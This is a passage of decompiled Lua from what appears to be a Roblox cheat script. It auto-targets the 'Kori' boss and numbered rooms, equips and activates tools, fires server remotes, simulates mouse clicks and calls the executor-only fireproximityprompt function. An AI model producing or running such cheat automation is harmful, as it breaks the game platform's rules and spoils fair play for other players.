                        if wait_5 ~= nil then
                            wait_5 = wait_5.Parent
                        else
                            wait_5 = nil
                        end
                        if wait_5 then
                            wait_5 = vaultTarget
                            if wait_5 ~= nil then
                                wait_5 = wait_5.Name
                            else
                                wait_5 = nil
                            end
                            if (wait_5 == "basehitbox") then
                                wait_5 = vaultTarget
                                if wait_5 ~= nil then
                                    wait_5 = wait_5.Parent
                                else
                                    wait_5 = nil
                                end
                                if wait_5 ~= nil then
                                    wait_5 = wait_5.Name
                                else
                                    wait_5 = nil
                                end
                                if (wait_5 == "BookHand") then
                                    wait_5 = pcall
                                    local capture_62_6657_2, capture_62_6658_2, capture_62_6659_2 = val_153, val_154, val_155
                                    handler_21 = function()
                                        local find_first_child_of_class, tool, tool_2, value_14, value_15, value_16, val_156, game_4
                                        local find_first_child_of_class_2 = capture_62_6657_2.value
                                        if find_first_child_of_class_2 then
                                            find_first_child_of_class_2 = capture_62_6658_2.value
                                            if find_first_child_of_class_2 then
                                                find_first_child_of_class_2 = capture_62_6657_2.value
                                                find_first_child_of_class = find_first_child_of_class_2
                                                if find_first_child_of_class_2 then
                                                    find_first_child_of_class_2 = find_first_child_of_class_2.FindFirstChildOfClass
                                                else
                                                    find_first_child_of_class_2 = nil
                                                end
                                                tool = "Tool"
                                                find_first_child_of_class_2 = find_first_child_of_class_2(find_first_child_of_class, tool)
                                                if not find_first_child_of_class_2 then
                                                    find_first_child_of_class_2 = plr
                                                    find_first_child_of_class = find_first_child_of_class_2
                                                    if find_first_child_of_class_2 then
                                                        find_first_child_of_class_2 = find_first_child_of_class_2.FindFirstChild
                                                    else
                                                        find_first_child_of_class_2 = nil
                                                    end
                                                    tool = "Backpack"
                                                    find_first_child_of_class_2 = find_first_child_of_class_2(find_first_child_of_class, tool)
                                                    if find_first_child_of_class_2 then
                                                        tool = find_first_child_of_class_2
                                                        if find_first_child_of_class_2 then
                                                            find_first_child_of_class = find_first_child_of_class_2.FindFirstChildOfClass
                                                        else
                                                            find_first_child_of_class = nil
                                                        end
                                                        tool_2 = "Tool"
                                                        find_first_child_of_class = find_first_child_of_class(tool, tool_2)
                                                        if find_first_child_of_class then
                                                            tool = capture_62_6658_2.value
                                                            tool_2 = tool
                                                            if tool then
                                                                tool = tool.EquipTool
                                                            else
                                                                tool = nil
                                                            end
                                                            value_14 = find_first_child_of_class
                                                            tool(tool_2, value_14)
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                        find_first_child_of_class_2 = capture_62_6657_2.value
                                        if find_first_child_of_class_2 then
                                            find_first_child_of_class_2 = capture_62_6657_2.value
                                            find_first_child_of_class = find_first_child_of_class_2
                                            if find_first_child_of_class_2 then
                                                find_first_child_of_class_2 = find_first_child_of_class_2.FindFirstChildOfClass
                                            else
                                                find_first_child_of_class_2 = nil
                                            end
                                            tool = "Tool"
                                            find_first_child_of_class_2 = find_first_child_of_class_2(find_first_child_of_class, tool)
                                        end
                                        if find_first_child_of_class_2 then
                                            tool = find_first_child_of_class_2
                                            if find_first_child_of_class_2 then
                                                find_first_child_of_class = find_first_child_of_class_2.Activate
                                            else
                                                find_first_child_of_class = nil
                                            end
                                            find_first_child_of_class(tool)
                                        end
                                        find_first_child_of_class = capture_62_6659_2.value
                                        if find_first_child_of_class then
                                            find_first_child_of_class = capture_62_6659_2.value
                                            tool = find_first_child_of_class
                                            if find_first_child_of_class then
                                                find_first_child_of_class = find_first_child_of_class.FireServer
                                            else
                                                find_first_child_of_class = nil
                                            end
                                            find_first_child_of_class(tool)
                                        end
                                        find_first_child_of_class = game
                                        tool = find_first_child_of_class
                                        find_first_child_of_class = find_first_child_of_class.GetService
                                        tool_2 = "VirtualInputManager"
                                        find_first_child_of_class = find_first_child_of_class(tool, tool_2)
                                        if find_first_child_of_class then
                                            tool_2 = find_first_child_of_class
                                            if find_first_child_of_class then
                                                tool = find_first_child_of_class.SendMouseButtonEvent
                                            else
                                                tool = nil
                                            end
                                            value_14 = 0.0
                                            value_15 = 0.0
                                            value_16 = 0.0
                                            val_156 = true
                                            game_4 = game
                                            tool(tool_2, value_14, value_15, value_16, val_156, game_4, 1.0)
                                            tool_2 = find_first_child_of_class
                                            if find_first_child_of_class then
                                                tool = find_first_child_of_class.SendMouseButtonEvent
                                            else
                                                tool = nil
                                            end
                                            value_14 = 0.0
                                            value_15 = 0.0
                                            value_16 = 0.0
                                            val_156 = false
                                            game_4 = game
                                            tool(tool_2, value_14, value_15, value_16, val_156, game_4, 1.0)
                                        end
                                        return
                                    end
                                    wait_5(handler_21)
                                end
                            end
                        end
                    end
                end
            end
        end
    end
    tbl_25.value(make_tab)
    tbl_25.value = nil
    make_tab = 80.0
    make_tab_2 = function()
        local pack_result_29, pack_result_30, pack_result_31, pack_result_32
        local math_6 = math
        if math_6 ~= nil then
            math_6 = math_6.huge
        else
            math_6 = nil
        end
        local pack_result_33 = nil
        local pairs_7 = pairs
        local workspace_4 = workspace
        local pack_result_34 = workspace_4
        workspace_4 = workspace_4.GetChildren
        local pack_result_35 = pack(workspace_4(pack_result_34))
        if pack_result_35.n >= 1 then
            workspace_4 = pack_result_35[1]
        end
        if pack_result_35.n >= 2 then
            pack_result_34 = pack_result_35[2]
        end
        if pack_result_35.n >= 3 then
            pack_result_29 = pack_result_35[3]
        end
        if pack_result_35.n >= 4 then
            pack_result_30 = pack_result_35[4]
        end
        if pack_result_35.n >= 5 then
            pack_result_31 = pack_result_35[5]
        end
        if pack_result_35.n >= 6 then
            pack_result_32 = pack_result_35[6]
        end
        pairs_7 = pairs_7(unpack(pack_result_35, 1, pack_result_35.n))
        while true do
            pack_result_29 = pairs_7(workspace_4, pack_result_34)
            if pack_result_29 ~= nil then
                pack_result_34 = pack_result_29
                pack_result_31 = tonumber
                if pack_result_30 ~= nil then
                    pack_result_32 = pack_result_30.Name
                else
                    pack_result_32 = nil
                end
                pack_result_31 = pack_result_31(pack_result_32)
                if pack_result_31 then
                    if (pack_result_31 < math_6) then
                        math_6 = pack_result_31
                        pack_result_33 = pack_result_30
                    end
                end
            else
                break
            end
        end
        return pack_result_33, math_6
    end
    tbl_7 = function(argument_1)
        local workspace_5 = workspace
        local is_a_3 = workspace_5
        workspace_5 = workspace_5.FindFirstChild
        local text_8 = tostring
        local pack_result_36 = argument_1
        local pack_result_37 = pack(text_8(pack_result_36))
        if pack_result_37.n >= 1 then
            text_8 = pack_result_37[1]
        end
        if pack_result_37.n >= 2 then
            pack_result_36 = pack_result_37[2]
        end
        workspace_5 = workspace_5(is_a_3, unpack(pack_result_37, 1, pack_result_37.n))
        if workspace_5 then
            text_8 = workspace_5
            if workspace_5 then
                is_a_3 = workspace_5.IsA
            else
                is_a_3 = nil
            end
            pack_result_36 = "Model"
            is_a_3 = is_a_3(text_8, pack_result_36)
            if is_a_3 then
                return workspace_5
            else
                is_a_3 = nil
                return is_a_3
            end
        else
            is_a_3 = nil
            return is_a_3
        end
    end
    do
        local val_157 = handler_4
        handler_result = function(argument_1)
            local get_descendants, pack_result_38, pack_result_39, pack_result_40, pack_result_41, pack_result_42
            local tbl_52 = {}
            local pairs_8 = pairs
            local pack_result_43 = argument_1
            if argument_1 then
                get_descendants = argument_1.GetDescendants
            else
                get_descendants = nil
            end
            local pack_result_44 = pack(get_descendants(pack_result_43))
            if pack_result_44.n >= 1 then
                get_descendants = pack_result_44[1]
            end
            if pack_result_44.n >= 2 then
                pack_result_43 = pack_result_44[2]
            end
            if pack_result_44.n >= 3 then
                pack_result_38 = pack_result_44[3]
            end
            if pack_result_44.n >= 4 then
                pack_result_39 = pack_result_44[4]
            end
            if pack_result_44.n >= 5 then
                pack_result_40 = pack_result_44[5]
            end
            if pack_result_44.n >= 6 then
                pack_result_41 = pack_result_44[6]
            end
            if pack_result_44.n >= 7 then
                pack_result_42 = pack_result_44[7]
            end
            pairs_8 = pairs_8(unpack(pack_result_44, 1, pack_result_44.n))
            while true do
                pack_result_38 = pairs_8(get_descendants, pack_result_43)
                if pack_result_38 ~= nil then
                    pack_result_43 = pack_result_38
                    pack_result_40 = val_157
                    pack_result_41 = pack_result_39
                    pack_result_40 = pack_result_40(pack_result_41)
                    if pack_result_40 then
                        pack_result_40 = table
                        if pack_result_40 ~= nil then
                            pack_result_40 = pack_result_40.insert
                        else
                            pack_result_40 = nil
                        end
                        pack_result_41 = tbl_52
                        pack_result_42 = pack_result_39
                        pack_result_40(pack_result_41, pack_result_42)
                    end
                else
                    break
                end
            end
            return tbl_52
        end
    end
    do
        local val_158, capture_1_151042, val_159, val_160 = handler_result, tbl_23, workspace_2, handler_4
        info = function(argument_1)
            local pack_result_45
            local val_158_result, get_pivot, val_161, pairs_9, get_children_2, pack_result_46, pack_result_47, pack_result_48, pack_result_49, pack_result_50, pack_result_51
            if not argument_1 then
                val_158_result = false
                return val_158_result
            else
                val_158_result = val_158(argument_1)
                get_pivot = #(val_158_result)
                if (0.0 < get_pivot) then
                    get_pivot = true
                    return get_pivot
                else
                    val_161 = argument_1
                    if argument_1 then
                        get_pivot = argument_1.GetPivot
                    else
                        get_pivot = nil
                    end
                    get_pivot = get_pivot(val_161)
                    if get_pivot ~= nil then
                        get_pivot = get_pivot.Position
                    else
                        get_pivot = nil
                    end
                    val_161 = (capture_1_151042.value)(argument_1)
                    pairs_9 = pairs
                    get_children_2 = val_159
                    pack_result_46 = get_children_2
                    if get_children_2 then
                        get_children_2 = get_children_2.GetChildren
                    else
                        get_children_2 = nil
                    end
                    pack_result_45 = pack(get_children_2(pack_result_46))
                    if pack_result_45.n >= 1 then
                        get_children_2 = pack_result_45[1]
                    end
                    if pack_result_45.n >= 2 then
                        pack_result_46 = pack_result_45[2]
                    end
                    if pack_result_45.n >= 3 then
                        pack_result_47 = pack_result_45[3]
                    end
                    if pack_result_45.n >= 4 then
                        pack_result_48 = pack_result_45[4]
                    end
                    if pack_result_45.n >= 5 then
                        pack_result_49 = pack_result_45[5]
                    end
                    if pack_result_45.n >= 6 then
                        pack_result_50 = pack_result_45[6]
                    end
                    if pack_result_45.n >= 7 then
                        pack_result_51 = pack_result_45[7]
                    end
                    pairs_9 = pairs_9(unpack(pack_result_45, 1, pack_result_45.n))
                    while true do
                        pack_result_47 = pairs_9(get_children_2, pack_result_46)
                        if pack_result_47 ~= nil then
                            pack_result_46 = pack_result_47
                            pack_result_49 = val_160
                            pack_result_50 = pack_result_48
                            pack_result_49 = pack_result_49(pack_result_50)
                            if pack_result_49 then
                                pack_result_50 = pack_result_48
                                if pack_result_48 then
                                    pack_result_49 = pack_result_48.FindFirstChild
                                else
                                    pack_result_49 = nil
                                end
                                pack_result_51 = "HumanoidRootPart"
                                pack_result_49 = pack_result_49(pack_result_50, pack_result_51)
                                if pack_result_49 then
                                    if pack_result_49 ~= nil then
                                        pack_result_50 = pack_result_49.Position
                                    else
                                        pack_result_50 = nil
                                    end
                                    pack_result_50 = (pack_result_50) - (get_pivot)
                                    if pack_result_50 ~= nil then
                                        pack_result_50 = pack_result_50.Magnitude
                                    else
                                        pack_result_50 = nil
                                    end
                                    if (pack_result_50 <= val_161) then
                                        pack_result_50 = true
                                        return pack_result_50
                                    end
                                end
                            end
                        else
                            pairs_9 = false
                            return pairs_9
                        end
                    end
                end
            end
        end
    end
    do
        local val_162, val_163 = workspace_2, info
        tbl_26.value = function()
            local pack_result_52, pack_result_53, pack_result_54, pack_result_55, pack_result_56, pack_result_57
            local tbl_53 = {}
            local pairs_10 = pairs
            local get_children_3 = val_162
            local pack_result_58 = get_children_3
            if get_children_3 then
                get_children_3 = get_children_3.GetChildren
            else
                get_children_3 = nil
            end
            local pack_result_59 = pack(get_children_3(pack_result_58))
            if pack_result_59.n >= 1 then
                get_children_3 = pack_result_59[1]
            end
            if pack_result_59.n >= 2 then
                pack_result_58 = pack_result_59[2]
            end
            if pack_result_59.n >= 3 then
                pack_result_52 = pack_result_59[3]
            end
            if pack_result_59.n >= 4 then
                pack_result_53 = pack_result_59[4]
            end
            if pack_result_59.n >= 5 then
                pack_result_54 = pack_result_59[5]
            end
            if pack_result_59.n >= 6 then
                pack_result_55 = pack_result_59[6]
            end
            if pack_result_59.n >= 7 then
                pack_result_56 = pack_result_59[7]
            end
            if pack_result_59.n >= 8 then
                pack_result_57 = pack_result_59[8]
            end
            pairs_10 = pairs_10(unpack(pack_result_59, 1, pack_result_59.n))
            while true do
                pack_result_52 = pairs_10(get_children_3, pack_result_58)
                if pack_result_52 ~= nil then
                    pack_result_58 = pack_result_52
                    pack_result_54 = tonumber
                    if pack_result_53 ~= nil then
                        pack_result_55 = pack_result_53.Name
                    else
                        pack_result_55 = nil
                    end
                    pack_result_54 = pack_result_54(pack_result_55)
                    if pack_result_54 then
                        pack_result_55 = table
                        if pack_result_55 ~= nil then
                            pack_result_55 = pack_result_55.insert
                        else
                            pack_result_55 = nil
                        end
                        pack_result_56 = tbl_53
                        pack_result_57 = {
                            model = pack_result_53,
                            num = pack_result_54,
                        }
                        pack_result_55(pack_result_56, pack_result_57)
                    end
                else
                    break
                end
            end
            pairs_10 = table
            if pairs_10 ~= nil then
                pairs_10 = pairs_10.sort
            else
                pairs_10 = nil
            end
            get_children_3 = tbl_53
            pack_result_58 = function(argument_1, argument_2)
                local num_2, num_3
                if argument_1 ~= nil then
                    num_2 = argument_1.num
                else
                    num_2 = nil
                end
                if argument_2 ~= nil then
                    num_3 = argument_2.num
                else
                    num_3 = nil
                end
                if num_2 >= num_3 then
                    num_2 = false
                else
                    num_2 = true
                end
                return num_2
            end
            pairs_10(get_children_3, pack_result_58)
            pairs_10 = ipairs
            get_children_3 = tbl_53
            pairs_10 = pairs_10(get_children_3)
            while true do
                pack_result_52 = pairs_10(get_children_3, pack_result_58)
                if pack_result_52 ~= nil then
                    pack_result_58 = pack_result_52
                    pack_result_54 = val_163
                    if pack_result_53 ~= nil then
                        pack_result_55 = pack_result_53.model
                    else
                        pack_result_55 = nil
                    end
                    pack_result_54 = pack_result_54(pack_result_55)
                    if pack_result_54 then
                        if pack_result_53 ~= nil then
                            pack_result_54 = pack_result_53.model
                        else
                            pack_result_54 = nil
                        end
                        if pack_result_53 ~= nil then
                            pack_result_55 = pack_result_53.num
                        else
                            pack_result_55 = nil
                        end
                        return pack_result_54, pack_result_55
                    end
                else
                    pairs_10 = val_162
                    get_children_3 = pairs_10
                    if pairs_10 then
                        pairs_10 = pairs_10.FindFirstChild
                    else
                        pairs_10 = nil
                    end
                    pack_result_58 = "BossRoom"
                    pairs_10 = pairs_10(get_children_3, pack_result_58)
                    if not pairs_10 then
                        pairs_10 = val_162
                        get_children_3 = pairs_10
                        if pairs_10 then
                            pairs_10 = pairs_10.FindFirstChild
                        else
                            pairs_10 = nil
                        end
                        pack_result_58 = "bossVariation"
                        pairs_10 = pairs_10(get_children_3, pack_result_58)
                        if pairs_10 then
                            get_children_3 = val_163
                            pack_result_58 = pairs_10
                            get_children_3 = get_children_3(pack_result_58)
                            if get_children_3 then
                                get_children_3 = pairs_10
                                pack_result_58 = "Boss"
                                return get_children_3, pack_result_58
                            else
                                get_children_3 = #(tbl_53)
                                if (0.0 < get_children_3) then
                                    get_children_3 = #(tbl_53)
                                    if tbl_53 ~= nil then
                                        get_children_3 = tbl_53[get_children_3]
                                    else
                                        get_children_3 = nil
                                    end
                                    if get_children_3 ~= nil then
                                        pack_result_58 = get_children_3.model
                                    else
                                        pack_result_58 = nil
                                    end
                                    if get_children_3 ~= nil then
                                        pack_result_52 = get_children_3.num
                                    else
                                        pack_result_52 = nil
                                    end
                                    return pack_result_58, pack_result_52
                                else
                                    if pairs_10 then
                                        get_children_3 = pairs_10
                                        pack_result_58 = "Boss"
                                        return get_children_3, pack_result_58
                                    else
                                        get_children_3 = nil
                                        pack_result_58 = nil
                                        return get_children_3, pack_result_58
                                    end
                                end
                            end
                        else
                            get_children_3 = #(tbl_53)
                            if (0.0 < get_children_3) then
                                get_children_3 = #(tbl_53)
                                if tbl_53 ~= nil then
                                    get_children_3 = tbl_53[get_children_3]
                                else
                                    get_children_3 = nil
                                end
                                if get_children_3 ~= nil then
                                    pack_result_58 = get_children_3.model
                                else
                                    pack_result_58 = nil
                                end
                                if get_children_3 ~= nil then
                                    pack_result_52 = get_children_3.num
                                else
                                    pack_result_52 = nil
                                end
                                return pack_result_58, pack_result_52
                            else
                                if pairs_10 then
                                    get_children_3 = pairs_10
                                    pack_result_58 = "Boss"
                                    return get_children_3, pack_result_58
                                else
                                    get_children_3 = nil
                                    pack_result_58 = nil
                                    return get_children_3, pack_result_58
                                end
                            end
                        end
                    else
                        if pairs_10 then
                            get_children_3 = val_163
                            pack_result_58 = pairs_10
                            get_children_3 = get_children_3(pack_result_58)
                            if get_children_3 then
                                get_children_3 = pairs_10
                                pack_result_58 = "Boss"
                                return get_children_3, pack_result_58
                            else
                                get_children_3 = #(tbl_53)
                                if (0.0 < get_children_3) then
                                    get_children_3 = #(tbl_53)
                                    if tbl_53 ~= nil then
                                        get_children_3 = tbl_53[get_children_3]
                                    else
                                        get_children_3 = nil
                                    end
                                    if get_children_3 ~= nil then
                                        pack_result_58 = get_children_3.model
                                    else
                                        pack_result_58 = nil
                                    end
                                    if get_children_3 ~= nil then
                                        pack_result_52 = get_children_3.num
                                    else
                                        pack_result_52 = nil
                                    end
                                    return pack_result_58, pack_result_52
                                else
                                    if pairs_10 then
                                        get_children_3 = pairs_10
                                        pack_result_58 = "Boss"
                                        return get_children_3, pack_result_58
                                    else
                                        get_children_3 = nil
                                        pack_result_58 = nil
                                        return get_children_3, pack_result_58
                                    end
                                end
                            end
                        else
                            get_children_3 = #(tbl_53)
                            if (0.0 < get_children_3) then
                                get_children_3 = #(tbl_53)
                                if tbl_53 ~= nil then
                                    get_children_3 = tbl_53[get_children_3]
                                else
                                    get_children_3 = nil
                                end
                                if get_children_3 ~= nil then
                                    pack_result_58 = get_children_3.model
                                else
                                    pack_result_58 = nil
                                end
                                if get_children_3 ~= nil then
                                    pack_result_52 = get_children_3.num
                                else
                                    pack_result_52 = nil
                                end
                                return pack_result_58, pack_result_52
                            else
                                if pairs_10 then
                                    get_children_3 = pairs_10
                                    pack_result_58 = "Boss"
                                    return get_children_3, pack_result_58
                                else
                                    get_children_3 = nil
                                    pack_result_58 = nil
                                    return get_children_3, pack_result_58
                                end
                            end
                        end
                    end
                end
            end
        end
    end
    tbl_27.value = false
    tbl_28.value = false
    tbl_29.value = function(argument_1)
        local pcall_8, handler_22
        if not argument_1 then
            return
        else
            pcall_8 = fireproximityprompt
            if pcall_8 then
                pcall_8 = pcall
                local val_164 = argument_1
                handler_22 = function()
                    fireproximityprompt(val_164)
                    return
                end
                pcall_8(handler_22)
            else
                pcall_8 = pcall
                local val_165 = argument_1
                handler_22 = function()
                    local input_began = val_165
                    local val_166 = input_began
                    if input_began then
                        input_began = input_began.InputBegan
                    else
                        input_began = nil
                    end
                    local user_input_type = Enum.UserInputType
                    if user_input_type ~= nil then
                        user_input_type = user_input_type.MouseButton1
                    else
                        user_input_type = nil
                    end
                    input_began(val_166, user_input_type)
                    ;
                    (task.wait)(0.1)
                    input_began = val_165
                    val_166 = input_began
                    if input_began then
                        input_began = input_began.InputEnded
                    else
                        input_began = nil
                    end
                    user_input_type = Enum.UserInputType
                    if user_input_type ~= nil then
                        user_input_type = user_input_type.MouseButton1
                    else
                        user_input_type = nil
                    end
                    input_began(val_166, user_input_type)
                    return
                end
                pcall_8(handler_22)
            end
            return
        end
    end
    tbl_30.value = nil
    do
        local capture_1_154113 = tbl_10
        tbl_31.value = function(argument_1)
            local x_2, tbl_value_2, z_2, tbl_value_3
            local tbl_value_4 = capture_1_154113.value
            if tbl_value_4 then
                if not argument_1 then
                    return argument_1
                else
                    tbl_value_4 = Vector3.new
                    if argument_1 ~= nil then
                        x_2 = argument_1.X
                    else
                        x_2 = nil
                    end
                    tbl_value_2 = 0.0
                    if argument_1 ~= nil then
                        z_2 = argument_1.Z
                    else
                        z_2 = nil
                    end
                    tbl_value_4 = tbl_value_4(x_2, tbl_value_2, z_2)
                    x_2 = Vector3.new
                    tbl_value_2 = capture_1_154113.value
                    if tbl_value_2 ~= nil then
                        tbl_value_2 = tbl_value_2.Position
                    else
                        tbl_value_2 = nil
                    end
                    if tbl_value_2 ~= nil then
                        tbl_value_2 = tbl_value_2.X
                    else
                        tbl_value_2 = nil
                    end
                    z_2 = 0.0
                    tbl_value_3 = capture_1_154113.value
                    if tbl_value_3 ~= nil then
                        tbl_value_3 = tbl_value_3.Position
                    else
                        tbl_value_3 = nil
                    end
                    if tbl_value_3 ~= nil then
                        tbl_value_3 = tbl_value_3.Z
                    else
                        tbl_value_3 = nil
                    end
                    x_2 = x_2(tbl_value_2, z_2, tbl_value_3)
                    tbl_value_4 = (tbl_value_4) - (x_2)
                    if tbl_value_4 ~= nil then
                        tbl_value_4 = tbl_value_4.Magnitude
                    else
                        tbl_value_4 = nil
                    end
                    x_2 = capture_1_154113.value
                    if x_2 ~= nil then
                        x_2 = x_2.Position
                    else
                        x_2 = nil
                    end
                    if x_2 ~= nil then
                        x_2 = x_2.Y
                    else
                        x_2 = nil
                    end
                    if argument_1 ~= nil then
                        tbl_value_2 = argument_1.Y
                    else
                        tbl_value_2 = nil
                    end
                    if (x_2 < tbl_value_2) then
                        if (15.0 < tbl_value_4) then
                            x_2 = Vector3.new
                            tbl_value_2 = capture_1_154113.value
                            if tbl_value_2 ~= nil then
                                tbl_value_2 = tbl_value_2.Position
                            else
                                tbl_value_2 = nil
                            end
                            if tbl_value_2 ~= nil then
                                tbl_value_2 = tbl_value_2.X
                            else
                                tbl_value_2 = nil
                            end
                            if argument_1 ~= nil then
                                z_2 = argument_1.Y
                            else
                                z_2 = nil
                            end
                            z_2 = (z_2) + (5.0)
                            tbl_value_3 = capture_1_154113.value
                            if tbl_value_3 ~= nil then
                                tbl_value_3 = tbl_value_3.Position
                            else
                                tbl_value_3 = nil
                            end
                            if tbl_value_3 ~= nil then
                                tbl_value_3 = tbl_value_3.Z
                            else
                                tbl_value_3 = nil
                            end
                            return x_2(tbl_value_2, z_2, tbl_value_3)
                        end
                        return argument_1
                    end
                    return argument_1
                end
            end
            return argument_1
        end
    end
    tbl_32.value = function()
        local pack_result_60
        local pack_result_61, pack_result_62, pack_result_63, pack_result_64, pack_result_65, pack_result_66
        local workspace_6 = workspace
        local pairs_11 = workspace_6
        workspace_6 = workspace_6.FindFirstChild
        local kori_boss_fight = "KoriBossFight"
        workspace_6 = workspace_6(pairs_11, kori_boss_fight)
        if workspace_6 then
            pairs_11 = pairs
            pack_result_61 = workspace_6
            if workspace_6 then
                kori_boss_fight = workspace_6.GetChildren
            else
                kori_boss_fight = nil
            end
            pack_result_60 = pack(kori_boss_fight(pack_result_61))
            if pack_result_60.n >= 1 then
                kori_boss_fight = pack_result_60[1]
            end
            if pack_result_60.n >= 2 then
                pack_result_61 = pack_result_60[2]
            end
            if pack_result_60.n >= 3 then
                pack_result_62 = pack_result_60[3]
            end
            if pack_result_60.n >= 4 then
                pack_result_63 = pack_result_60[4]
            end
            if pack_result_60.n >= 5 then
                pack_result_64 = pack_result_60[5]
            end
            if pack_result_60.n >= 6 then
                pack_result_65 = pack_result_60[6]
            end
            if pack_result_60.n >= 7 then
                pack_result_66 = pack_result_60[7]
            end
            pairs_11 = pairs_11(unpack(pack_result_60, 1, pack_result_60.n))
            while true do
                pack_result_62 = pairs_11(kori_boss_fight, pack_result_61)
                if pack_result_62 ~= nil then
                    pack_result_61 = pack_result_62
                    pack_result_65 = pack_result_63
                    if pack_result_63 then
                        pack_result_64 = pack_result_63.IsA
                    else
                        pack_result_64 = nil
                    end
                    pack_result_66 = "Model"
                    pack_result_64 = pack_result_64(pack_result_65, pack_result_66)
                    if pack_result_64 then
                        if pack_result_63 ~= nil then
                            pack_result_64 = pack_result_63.Name
                        else
                            pack_result_64 = nil
                        end
                        if pack_result_64 ~= "StartKoriFightZone" then
                            pack_result_65 = pack_result_63
                            if pack_result_63 then
                                pack_result_64 = pack_result_63.FindFirstChild
                            else
                                pack_result_64 = nil
                            end
                            pack_result_66 = "Humanoid"
                            pack_result_64 = pack_result_64(pack_result_65, pack_result_66)
                            if pack_result_64 then
                                if pack_result_64 ~= nil then
                                    pack_result_65 = pack_result_64.Health
                                else
                                    pack_result_65 = nil
                                end
                                if (0.0 < pack_result_65) then
                                    pack_result_66 = pack_result_64
                                    if pack_result_64 then
                                        pack_result_65 = pack_result_64.GetState
                                    else
                                        pack_result_65 = nil
                                    end
                                    pack_result_65 = pack_result_65(pack_result_66)
                                    pack_result_66 = Enum.HumanoidStateType
                                    if pack_result_66 ~= nil then
                                        pack_result_66 = pack_result_66.Dead
                                    else
                                        pack_result_66 = nil
                                    end
                                    if pack_result_65 ~= pack_result_66 then
                                        return pack_result_63
                                    end
                                end
                            end
                        end
                    end
                else
                    pairs_11 = workspace
                    kori_boss_fight = pairs_11
                    pairs_11 = pairs_11.FindFirstChild
                    pack_result_61 = "Kori"
                    pairs_11 = pairs_11(kori_boss_fight, pack_result_61)
                    if not pairs_11 then
                        pairs_11 = workspace
                        kori_boss_fight = pairs_11
                        pairs_11 = pairs_11.FindFirstChild
                        pack_result_61 = "KoriBoss"
                        pairs_11 = pairs_11(kori_boss_fight, pack_result_61)
                        if pairs_11 then
                            pack_result_61 = pairs_11
                            if pairs_11 then
                                kori_boss_fight = pairs_11.FindFirstChild
                            else
                                kori_boss_fight = nil
                            end
                            pack_result_62 = "Humanoid"
                            kori_boss_fight = kori_boss_fight(pack_result_61, pack_result_62)
                            if kori_boss_fight then
                                if kori_boss_fight ~= nil then
                                    pack_result_61 = kori_boss_fight.Health
                                else
                                    pack_result_61 = nil
                                end
                                if (0.0 < pack_result_61) then
                                    pack_result_62 = kori_boss_fight
                                    if kori_boss_fight then
                                        pack_result_61 = kori_boss_fight.GetState
                                    else
                                        pack_result_61 = nil
                                    end
                                    pack_result_61 = pack_result_61(pack_result_62)
                                    pack_result_62 = Enum.HumanoidStateType
                                    if pack_result_62 ~= nil then
                                        pack_result_62 = pack_result_62.Dead
                                    else
                                        pack_result_62 = nil
                                    end
                                    if pack_result_61 ~= pack_result_62 then
                                        return pairs_11
                                    else
                                        kori_boss_fight = nil
                                        return kori_boss_fight
                                    end
                                else
                                    kori_boss_fight = nil
                                    return kori_boss_fight
                                end
                            else
                                kori_boss_fight = nil
                                return kori_boss_fight
                            end
                        else
                            kori_boss_fight = nil
                            return kori_boss_fight
                        end
                    else
                        if pairs_11 then
                            pack_result_61 = pairs_11
                            if pairs_11 then
                                kori_boss_fight = pairs_11.FindFirstChild
                            else
                                kori_boss_fight = nil
                            end
                            pack_result_62 = "Humanoid"
                            kori_boss_fight = kori_boss_fight(pack_result_61, pack_result_62)
                            if kori_boss_fight then
                                if kori_boss_fight ~= nil then
                                    pack_result_61 = kori_boss_fight.Health
                                else
                                    pack_result_61 = nil
                                end
                                if (0.0 < pack_result_61) then
                                    pack_result_62 = kori_boss_fight
                                    if kori_boss_fight then
                                        pack_result_61 = kori_boss_fight.GetState
                                    else
                                        pack_result_61 = nil
                                    end
                                    pack_result_61 = pack_result_61(pack_result_62)
                                    pack_result_62 = Enum.HumanoidStateType
                                    if pack_result_62 ~= nil then
                                        pack_result_62 = pack_result_62.Dead
                                    else
                                        pack_result_62 = nil
                                    end
                                    if pack_result_61 ~= pack_result_62 then
                                        return pairs_11
                                    else
                                        kori_boss_fight = nil
                                        return kori_boss_fight
                                    end
                                else
                                    kori_boss_fight = nil
                                    return kori_boss_fight
                                end
                            else
                                kori_boss_fight = nil
                                return kori_boss_fight
                            end
                        else
                            kori_boss_fight = nil
                            return kori_boss_fight
                        end
                    end
                end
            end
        else
            pairs_11 = workspace
            kori_boss_fight = pairs_11
            pairs_11 = pairs_11.FindFirstChild
            pack_result_61 = "Kori"
            pairs_11 = pairs_11(kori_boss_fight, pack_result_61)
            if not pairs_11 then
                pairs_11 = workspace
                kori_boss_fight = pairs_11
                pairs_11 = pairs_11.FindFirstChild
                pack_result_61 = "KoriBoss"
                pairs_11 = pairs_11(kori_boss_fight, pack_result_61)
            end
            if pairs_11 then
                pack_result_61 = pairs_11
                if pairs_11 then
                    kori_boss_fight = pairs_11.FindFirstChild
                else
                    kori_boss_fight = nil
                end
                pack_result_62 = "Humanoid"
                kori_boss_fight = kori_boss_fight(pack_result_61, pack_result_62)
                if kori_boss_fight then
                    if kori_boss_fight ~= nil then
                        pack_result_61 = kori_boss_fight.Health
                    else
                        pack_result_61 = nil
                    end
                    if (0.0 < pack_result_61) then
                        pack_result_62 = kori_boss_fight
                        if kori_boss_fight then
                            pack_result_61 = kori_boss_fight.GetState
                        else
                            pack_result_61 = nil
                        end
                        pack_result_61 = pack_result_61(pack_result_62)
                        pack_result_62 = Enum.HumanoidStateType
                        if pack_result_62 ~= nil then
                            pack_result_62 = pack_result_62.Dead
                        else
                            pack_result_62 = nil
                        end
                        if pack_result_61 ~= pack_result_62 then
                            return pairs_11
                        else
                            kori_boss_fight = nil
                            return kori_boss_fight
                        end
                    else
                        kori_boss_fight = nil
                        return kori_boss_fight
                    end
                else
                    kori_boss_fight = nil
                    return kori_boss_fight
                end
            else
                kori_boss_fight = nil
                return kori_boss_fight
            end
        end
    end
    tbl_33.value = nil
    tbl_34.value = 0.0
    handler_13 = function(argument_1)
        local value_17, find_first_child_10, is_a_4, health, value_object
        if not argument_1 then
            value_17 = 0.0
            return value_17
        else
            value_17 = 0.0
            is_a_4 = argument_1
            if argument_1 then
                find_first_child_10 = argument_1.FindFirstChild
            else
                find_first_child_10 = nil
            end
            health = "Health"
            find_first_child_10 = find_first_child_10(is_a_4, health)
            if find_first_child_10 then
                health = find_first_child_10
                if find_first_child_10 then
                    is_a_4 = find_first_child_10.IsA
                else
